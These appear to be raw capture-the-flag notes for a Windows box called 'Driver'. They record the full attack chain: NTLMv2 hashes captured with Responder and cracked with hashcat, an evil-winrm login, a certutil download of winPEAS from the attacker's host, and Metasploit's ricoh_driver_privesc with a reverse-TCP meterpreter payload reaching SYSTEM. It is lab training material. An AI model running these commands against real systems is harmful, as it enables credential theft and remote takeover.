

reverse shell with scf

https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-shares/#write-permission

[SMB] NTLMv2 Client   : 10.129.95.238
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:58ca282f56c87c93:52012179226EE6A458E3064F31B00033:01010000000000007436E0D56B59DD016A1811645450BECA00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.95.238
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:0bda9ca80bd0cee0:33E3BD9EE0CC792F280E1645259DEF7A:0101000000000000E1E34DD66B59DD01E222817C52CCB10A00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.95.238
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:66af1306c0fe629d:61F542F7792D664A0E5189CAC972C44F:01010000000000000D937DD66B59DD010A5A793748A6619F00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.95.238
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:735e1bb542514753:67522EDC7FE0BD2DC8CAF77E8E2E6E7D:010100000000000067A1AFD66B59DD0149EEC2B8C8C8F7F700000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.95.238
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:a68e1915acf80c62:3861883BE5CE062FC6CA214DA681381A:010100000000000093F1DCD66B59DD01C08D11147BA6923100000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.95.238
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:ff38354691e0ad14:0BD198A2198A96548D388ED1C346B0A7:010100000000000056A00CD76B59DD0180DAA962A340B0CF00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.95.238
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:7e2425a37f3a8602:4C05A0E2426E4451C528E0C2BC84AD00:0101000000000000174C3CD76B59DD0195A9A73E4283426100000000020000000000000000000000
[+] Exiting...

sudo responder -w --lm -v -I tun0

hashcat -m 5600 hashes /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --show

evil-winrm -i 10.129.95.238 -u tony -p 'liltony'

*Evil-WinRM* PS C:\Users\tony\Desktop> type "C:/Users/tony/Desktop/user.txt"
0d702c352668a752d56d8fa6efc106e2
*Evil-WinRM* PS C:\Users\tony\Desktop> 


certutil.exe -f -urlcache -split http://10.10.15.194:8000/winPEASany_ofs.exe winpeas.exe






meterpreter > cat root.txt
9109177c0fa1889d2e41393df8670c94
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session 2...
msf exploit(windows/local/ricoh_driver_privesc) > show options

Module options (exploit/windows/local/ricoh_driver_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.194     yes       The listen address (an interface may be specified)
   LPORT     4441             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf exploit(windows/local/ricoh_driver_privesc) > 
